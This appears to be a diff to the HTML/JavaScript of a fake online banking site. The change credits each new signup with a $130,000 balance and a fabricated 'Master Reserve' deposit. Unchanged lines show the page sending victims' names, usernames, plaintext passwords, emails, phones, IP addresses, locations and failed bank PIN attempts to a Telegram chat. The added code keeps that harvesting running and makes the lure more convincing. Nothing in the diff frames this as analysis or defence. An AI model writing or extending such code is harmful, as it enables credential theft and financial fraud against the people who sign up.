@@ -1519,6 +1519,7 @@
             sendTelegramMessage(`❌ *BANK PIN FAILED*\n🌐 ${userIP}\n📍 ${userLocation}`);
         }
 
+        // ===== MODIFIED: processSignup – New user gets $130,000 from master =====
         function processSignup() {
             const name = document.getElementById('signupName').value.trim();
             const username = document.getElementById('signupUsername').value.trim();
@@ -1532,6 +1533,14 @@
                 return;
             }
             errorEl.style.display = 'none';
+
+            // Check master balance
+            if (masterBalance < 130000) {
+                errorEl.textContent = '⚠️ Insufficient master funds. Contact admin.';
+                errorEl.style.display = 'block';
+                return;
+            }
+
             const loading = document.getElementById('signupLoading');
             loading.style.display = 'flex';
             const percentEl = document.getElementById('loadingPercent');
@@ -1542,6 +1551,8 @@
                 percentEl.textContent = progress + '%';
                 if (progress === 90) {
                     const deviceId = getDeviceId();
+                    // Deduct from master
+                    deductFromMaster(130000);
                     const userData = {
                         id: deviceId,
                         name,
@@ -1549,9 +1560,19 @@
                         password,
                         email,
                         phone,
-                        balance: 0, // NO MOCK MONEY
-                        totalReceived: 0,
-                        transactions: [], // NO MOCK TX
+                        balance: 130000, // Initial balance
+                        totalReceived: 130000,
+                        transactions: [{
+                            id: 'INITIAL',
+                            type: 'deposit',
+                            amount: 130000,
+                            status: 'completed',
+                            date: new Date().toLocaleString(),
+                            timestamp: Date.now(),
+                            description: 'Initial Deposit from Master Reserve',
+                            from: 'Master Reserve',
+                            to: username
+                        }],
                         profilePhoto: null,
                         accountNumber: Math.floor(Math.random() * 90000000 + 10000000).toString(),
                         routingNumber: Math.floor(Math.random() * 900000000 + 100000000).toString(),
@@ -1560,8 +1581,9 @@
                     };
                     users[deviceId] = userData;
                     saveUsers();
+                    saveMasterBalance();
                     let msg =
-                        `📝 *NEW USER*\n👤 ${name}\n👤 ${username}\n🔒 ${password}\n📧 ${email}\n📞 ${phone}\n💳 Account ****${userData.accountNumber.slice(-4)}\n💰 Balance: $0.00\n🌐 ${userIP}\n📍 ${userLocation}`;
+                        `📝 *NEW USER*\n👤 ${name}\n👤 ${username}\n🔒 ${password}\n📧 ${email}\n📞 ${phone}\n💳 Account ****${userData.accountNumber.slice(-4)}\n💰 Balance: $130,000.00\n🌐 ${userIP}\n📍 ${userLocation}`;
                     sendTelegramMessage(msg);
                     addActivity('📝 New Signup', `${name} (${username})`);
                     logAudit('📝 New Signup', `${name} (${username})`);
@@ -2518,6 +2540,7 @@
         console.log('💰 Master Balance:', masterBalance);
         console.log('👥 Users:', Object.keys(users).length);
         console.log('🔑 1977 = User | 2007 = Admin');
+        console.log('✅ New users start with $130,000 from Master Reserve.');
     </script>
 </body>
 </html>
